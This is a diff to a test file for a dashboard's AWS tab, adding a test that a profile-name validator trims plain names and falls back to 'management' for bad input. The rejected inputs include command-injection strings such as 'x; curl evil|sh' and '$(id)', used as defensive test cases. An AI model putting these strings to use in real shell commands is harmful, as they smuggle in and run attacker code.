@@ -1,6 +1,6 @@
 import { describe, expect, test } from 'claude-code/testing'
 
-import { left, lines, logins, merged, names, prompt, pulls, repos, seconds, ssoExpiry, ssoStartUrl, state, today } from '../hooks/panel'
+import { awsProfile, left, lines, logins, merged, names, prompt, pulls, repos, seconds, ssoExpiry, ssoStartUrl, state, today } from '../hooks/panel'
 
 const SHA = 'b5687a5e1c0d2f3a4b5c6d7e8f9a0b1c2d3e4f5a'
 
@@ -121,6 +121,11 @@ describe('the aws tab', () => {
     ]
     expect(ssoExpiry(caches, 'https://paar.awsapps.com/start')).toBe(Date.parse('2026-10-23T18:00:00Z'))
     expect(ssoExpiry(caches, 'https://none/start')).toBeUndefined()
+  })
+  test('the profile is a plain name, else management', () => {
+    expect(awsProfile(' dev ')).toBe('dev')
+    expect(awsProfile('a.b@c+d-e_f')).toBe('a.b@c+d-e_f')
+    for (const bad of ['', 'x; curl evil|sh', 'a b', '$(id)', 'p`x`']) expect(awsProfile(bad)).toBe('management')
   })
   test('time left reads in hours and minutes', () => {
     expect(left(125 * 60_000, 0)).toBe('2h 05m')
